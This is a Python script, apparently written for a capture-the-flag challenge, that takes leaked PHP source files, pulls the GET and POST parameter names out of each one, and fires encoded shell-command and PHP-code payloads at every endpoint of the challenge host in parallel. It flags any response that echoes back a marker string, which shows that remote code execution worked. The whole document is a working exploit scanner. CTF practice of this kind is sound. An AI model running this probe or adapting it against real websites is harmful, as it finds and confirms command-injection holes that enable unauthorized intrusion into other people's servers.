#!/usr/bin/env python3
"""Probe every leaked PHP file for hidden command/PHP-code execution."""

from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import re
import sys

import requests


BASE = "http://57709ff493e994dca798fef5.http-ctf2.dasctf.com"
SOURCE = Path("/tmp/ctf-src.9vgiAJ/src")
MARKER = "RCEX973"
PAYLOADS = {
    "shell": r"printf '\122\103\105\130\071\067\063'",
    "php": "echo chr(82).chr(67).chr(69).chr(88).chr(57).chr(55).chr(51);",
}
PARAM_RE = re.compile(
    r"\$_(GET|POST)\s*\[\s*(['\"])([^'\"]+)\2\s*\]", re.IGNORECASE
)


def parameters(path: Path):
    text = path.read_text(errors="ignore")
    get_keys, post_keys = set(), set()
    for kind, _, key in PARAM_RE.findall(text):
        (get_keys if kind.upper() == "GET" else post_keys).add(key)
    return get_keys, post_keys


def probe(path: Path, mode: str):
    get_keys, post_keys = parameters(path)
    payload = PAYLOADS[mode]
    params = {key: payload for key in get_keys}
    data = {key: payload for key in post_keys}
    try:
        response = requests.post(
            f"{BASE}/{path.name}",
            params=params,
            data=data,
            timeout=15,
        )
        hit = MARKER in response.text
        return path.name, mode, response.status_code, len(response.content), hit, ""
    except Exception as exc:
        return path.name, mode, 0, 0, False, type(exc).__name__


def main():
    paths = sorted(SOURCE.glob("*.php"))
    jobs = [(path, mode) for path in paths for mode in PAYLOADS]
    hits = []
    errors = 0
    with ThreadPoolExecutor(max_workers=24) as pool:
        futures = [pool.submit(probe, path, mode) for path, mode in jobs]
        for index, future in enumerate(as_completed(futures), 1):
            result = future.result()
            name, mode, status, size, hit, error = result
            if hit:
                print(f"HIT\t{name}\t{mode}\t{status}\t{size}", flush=True)
                hits.append(result)
            if error:
                errors += 1
            if index % 500 == 0:
                print(
                    f"PROGRESS\t{index}/{len(jobs)}\thits={len(hits)}\terrors={errors}",
                    file=sys.stderr,
                    flush=True,
                )
    print(f"DONE\tjobs={len(jobs)}\thits={len(hits)}\terrors={errors}")
    return 0 if hits else 1


if __name__ == "__main__":
    raise SystemExit(main())
